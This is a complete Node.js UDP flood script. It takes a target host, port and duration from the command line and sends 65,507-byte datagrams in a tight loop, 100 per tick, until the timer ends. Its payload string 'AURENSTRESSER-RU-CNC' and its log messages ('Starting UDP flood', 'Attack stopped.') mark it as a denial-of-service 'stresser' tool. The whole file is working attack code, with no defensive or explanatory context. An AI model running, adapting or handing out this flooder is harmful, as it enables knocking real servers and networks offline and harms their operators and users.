const dgram = require('dgram');

const target = process.argv[2];
const port = Number(process.argv[3]);
const duration = Number(process.argv[4]);

function generatePayload(size) {
    const payload = Buffer.alloc(size);
    payload.fill('AURENSTRESSER-RU-CNC');
    return payload;
}

const payload = generatePayload(65507);
const socket = dgram.createSocket('udp4');

let running = true;
const PACKETS_PER_TICK = 100; // number of packets sent each iteration

function sendFlood() {
    if (!running) {
        socket.close();
        return;
    }

    for (let i = 0; i < PACKETS_PER_TICK; i++) {
        socket.send(payload, 0, payload.length, port, target, (err) => {
            if (err) {
                console.error('Error sending message:', err);
            }
        });
    }
    // Immediately queue next send without blocking event loop heavily
    setImmediate(sendFlood);
}

console.clear();
console.log(`Starting UDP flood on ${target}:${port} for ${duration} seconds...`);
sendFlood();

setTimeout(() => {
    running = false;
    console.log('Attack stopped.');
    process.exit(0);
}, duration * 1000);